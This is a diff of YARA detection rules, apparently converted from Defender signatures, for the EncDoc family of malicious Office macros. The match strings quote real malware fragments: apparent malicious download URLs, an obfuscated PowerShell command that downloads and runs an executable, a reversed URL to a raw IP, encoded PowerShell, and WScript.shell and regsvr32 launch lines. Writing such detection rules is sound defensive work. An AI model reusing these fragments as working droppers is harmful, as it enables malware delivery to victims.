@@ -1,20 +1,276 @@
-rule Trojan_O97M_Encdoc_PRBA_2147888724_0
+rule Trojan_O97M_EncDoc_SBR_2147759893_0
 {
     meta:
         author = "defender2yara"
-        detection_name = "Trojan:O97M/Encdoc.PRBA!MTB"
-        threat_id = "2147888724"
+        detection_name = "Trojan:O97M/EncDoc.SBR!MSR"
+        threat_id = "2147759893"
         type = "Trojan"
         platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
-        family = "Encdoc"
+        family = "EncDoc"
+        severity = "Critical"
+        info = "MSR: Microsoft Security Response"
+        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
+        threshold = "2"
+        strings_accuracy = "High"
+    strings:
+        $x_1_1 = "https://bluesteelenergy.com/derton/energy.php" ascii //weight: 1
+        $x_1_2 = "https://drmariepappas.com/drpepper/coladas.php" ascii //weight: 1
+        $x_1_3 = "https://woodenrestorations.com/gernaer/woodles.php" ascii //weight: 1
+        $x_1_4 = "zipfldr" ascii //weight: 1
+    condition:
+        (filesize < 20MB) and
+        (2 of ($x*))
+}
+
+rule Trojan_O97M_EncDoc_RA_2147770392_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:O97M/EncDoc.RA!MTB"
+        threat_id = "2147770392"
+        type = "Trojan"
+        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
+        family = "EncDoc"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
+        threshold = "4"
+        strings_accuracy = "Low"
+    strings:
+        $x_1_1 = " = \"WSCript.shell\"" ascii //weight: 1
+        $x_1_2 = {53 65 74 20 [0-47] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-31] 29 0d 0a [0-10] 3d 20 00 2e 52 75 6e 28 [0-15] 2c 20 [0-15] 29}  //weight: 1, accuracy: Low
+        $x_1_3 = "kui = Chr(fscv - 121)" ascii //weight: 1
+        $x_1_4 = "kui(220) & kui(198) & kui(189) & kui(153) & kui(168) & kui(220)" ascii //weight: 1
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
+rule Trojan_O97M_EncDoc_RA_2147770392_1
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:O97M/EncDoc.RA!MTB"
+        threat_id = "2147770392"
+        type = "Trojan"
+        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
+        family = "EncDoc"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
+        threshold = "3"
+        strings_accuracy = "Low"
+    strings:
+        $x_1_1 = {46 6f 72 20 69 20 3d 20 31 20 54 6f 20 [0-5] 0d 0a [0-15] 20 3d 20 4c 65 66 74 28 [0-15] 2c 20 69 29 0d 0a 49 66 20 4c 65 6e 28 [0-15] 29 20 3e 20 31 20 54 68 65 6e 0d 0a 20 20 20 [0-15] 20 3d 20 52 69 67 68 74 28 [0-15] 2c 20 31 29 20 26 20 [0-15] 0d 0a [0-31] 3d 20 [0-15] 45 6e 64 20 49 66}  //weight: 1, accuracy: Low
+        $x_1_2 = " = \"new:F935DC22\" + \"-1CF0-11D\" + \"0-ADB9-00C\" + \"04FD58A0B\"" ascii //weight: 1
+        $x_1_3 = {20 3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-10] 28 29 29}  //weight: 1, accuracy: Low
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
+rule Trojan_O97M_EncDoc_RH_2147771198_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:O97M/EncDoc.RH!MTB"
+        threat_id = "2147771198"
+        type = "Trojan"
+        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
+        family = "EncDoc"
         severity = "Critical"
         info = "MTB: Microsoft Threat Behavior"
         signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
         threshold = "2"
         strings_accuracy = "Low"
     strings:
-        $x_1_1 = {28 22 66 79 66 2f 6f 73 73 22 29 [0-100] 3d 65 6e 76 69 72 6f 6e 24 28 22 74 65 6d 70 22 29 26 22 5c 22 26 [0-255] 3d [0-32] 28 22 66 79 66 2f [0-80] 2f [0-48] 2f 78 78 78 30 30 3b 74 71 75 75 69 22 29 [0-15] 2c [0-80] 2c 00 2c 30 2c [0-48] 2c 22 6f 70 65 6e 22 2c 00 2c 22 22 2c 76 62 6e 75 6c 6c 73 74 72 69 6e 67 2c 76 62 6e 6f 72 6d 61 6c 66 6f 63 75 73 65 6e 64 73 75 62}  //weight: 1, accuracy: Low
-        $x_1_2 = {73 75 62 77 6f 72 6b 62 6f 6f 6b 5f 6f 70 65 6e 28 29 [0-64] 28 65 6e 63 29 64 69 6d 76 2c 72 2c 74 65 6d 70 65 6e 63 3d 73 74 72 72 65 76 65 72 73 65 28 65 6e 63 29 66 6f 72 72 3d 31 74 6f 6c 65 6e 28 65 6e 63 29 76 3d 6d 69 64 28 65 6e 63 2c 72 2c 31 29 74 65 6d 70 3d 74 65 6d 70 26 63 68 72 28 61 73 63 28 76 29 2d 31 29 [0-48] 3d 74 65 6d 70 65 6e 64 66 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
+        $x_1_1 = "dne!0d!qpxfstifmm!)ofx.pckfdu!Tztufn/Ofu/XfcDmjfou*/EpxompbeGjmf)(iuuq;00ftrvjofsptbhvjmbsmfsnb/dpn0y0ifbwz/fyf(-%fow;BqqEbub,(]OtDLB/fyf(*<)Ofx.Pckfdu!.dpn!Tifmm/Bqqmjdbujpo*/TifmmFyfdvuf)%fow;BqqEbub,(]OtDLB/fyf(*" ascii //weight: 1
+        $x_1_2 = {53 68 65 6c 6c 20 28 [0-95] 28 [0-95] 2c 20 22 31 32 22 29 29}  //weight: 1, accuracy: Low
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
+rule Trojan_O97M_EncDoc_RED_2147771310_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:O97M/EncDoc.RED!MTB"
+        threat_id = "2147771310"
+        type = "Trojan"
+        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
+        family = "EncDoc"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
+        threshold = "2"
+        strings_accuracy = "Low"
+    strings:
+        $x_1_1 = "= \"explorer.exe c:\\programdata\\bufBorderPointer.hta\"" ascii //weight: 1
+        $x_1_2 = {53 65 74 20 [0-15] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 0d 0a 00 2e 65 78 65 63 20 70 28 67 65 74 77 63 29}  //weight: 1, accuracy: Low
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
+rule Trojan_O97M_EncDoc_R_2147775869_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:O97M/EncDoc.R!MTB"
+        threat_id = "2147775869"
+        type = "Trojan"
+        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
+        family = "EncDoc"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
+        threshold = "4"
+        strings_accuracy = "Low"
+    strings:
+        $x_1_1 = {68 20 3d 20 48 65 61 70 43 72 65 61 74 65 28 34 30 30 30 31 2c 20 55 42 6f 75 6e 64 28 [0-10] 29 2c 20 55 42 6f 75 6e 64 28 00 29 29}  //weight: 1, accuracy: Low
+        $x_1_2 = "Xjpm = HeapAlloc(h, 9, UBound(Poiczy))" ascii //weight: 1
+        $x_1_3 = "Ctbl = RtlMoveMemory(Xjpm + Vymnxssy, Tjprz, 1)" ascii //weight: 1
+        $x_1_4 = "Sub AUtO_CLoSe()" ascii //weight: 1
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
+rule Trojan_O97M_EncDoc_RK_2147795394_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:O97M/EncDoc.RK!MTB"
+        threat_id = "2147795394"
+        type = "Trojan"
+        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
+        family = "EncDoc"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
+        threshold = "5"
+        strings_accuracy = "High"
+    strings:
+        $x_1_1 = "= \"cm\" + String(1, \"d\") & Space(1) + \"/c \" + \"\"" ascii //weight: 1
+        $x_1_2 = "= StrConv(\"a\", vbUpperCase) + Space(1)" ascii //weight: 1
+        $x_1_3 = "= Replace(\"s\", \"s\", \"m\")" ascii //weight: 1
+        $x_1_4 = "= Split(LString, \".\")" ascii //weight: 1
+        $x_1_5 = "= \"\\edfa3asdh\" & MyPos & String(3, \"q\")" ascii //weight: 1
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
+rule Trojan_O97M_EncDoc_RK_2147795394_1
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:O97M/EncDoc.RK!MTB"
+        threat_id = "2147795394"
+        type = "Trojan"
+        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
+        family = "EncDoc"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
+        threshold = "3"
+        strings_accuracy = "High"
+    strings:
+        $x_1_1 = "start /MIN C:\\Windo\" + \"ws\\SysWOW64\\\" + call1 + \" -win 1 -enc \" + enc" ascii //weight: 1
+        $x_1_2 = "call1 = \"WindowsPo\" + \"werShell\\v1.0\\pow\" + \"ershell.exe\"" ascii //weight: 1
+        $x_1_3 = "6AEEAUABQAEQAQQBUAEEAXAAkAFAAcgBvAGMATgBhAG0AZQAiACkA" ascii //weight: 1
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
+rule Trojan_O97M_EncDoc_RPM_2147816716_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:O97M/EncDoc.RPM!MTB"
+        threat_id = "2147816716"
+        type = "Trojan"
+        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
+        family = "EncDoc"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
+        threshold = "2"
+        strings_accuracy = "High"
+    strings:
+        $x_1_1 = "=strreverse(\"txt.cne/88/54.101.231.83//:ptth\")" ascii //weight: 1
+        $x_1_2 = "Replace(" ascii //weight: 1
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
+rule Trojan_O97M_EncDoc_RPM_2147816716_1
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:O97M/EncDoc.RPM!MTB"
+        threat_id = "2147816716"
+        type = "Trojan"
+        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
+        family = "EncDoc"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
+        threshold = "1"
+        strings_accuracy = "High"
+    strings:
+        $x_1_1 = "=chr(80)+range(\"c6\").notetextmsjz2=\"\"+eeeewmsjz3=msjz1&msjz2klsad().execmsjz3endfunctionfunctionklsad()asobjectsetklsad=getobject(range(\"c7\").notetext)endfunction" ascii //weight: 1
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
+rule Trojan_O97M_EncDoc_RPA_2147816876_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:O97M/EncDoc.RPA!MTB"
+        threat_id = "2147816876"
+        type = "Trojan"
+        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
+        family = "EncDoc"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
+        threshold = "3"
+        strings_accuracy = "Low"
+    strings:
+        $x_1_1 = ".OpenTextFile(YSDs + \"\\GGSQi.vbs\", 8, True)" ascii //weight: 1
+        $x_1_2 = "= GetTickCount + (Finish * 1000)" ascii //weight: 1
+        $x_1_3 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-10] 29}  //weight: 1, accuracy: Low
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
+rule Trojan_O97M_EncDoc_RP_2147898955_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:O97M/EncDoc.RP!MTB"
+        threat_id = "2147898955"
+        type = "Trojan"
+        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
+        family = "EncDoc"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
+        threshold = "5"
+        strings_accuracy = "High"
+    strings:
+        $x_1_1 = "regsvr32.exe" ascii //weight: 1
+        $x_1_2 = "SysWow64\\" ascii //weight: 1
+        $x_1_3 = "\\Windows\\" ascii //weight: 1
+        $x_1_4 = "\"7777\"" ascii //weight: 1
+        $x_1_5 = "RETURN" ascii //weight: 1
     condition:
         (filesize < 20MB) and
         (all of ($x*))
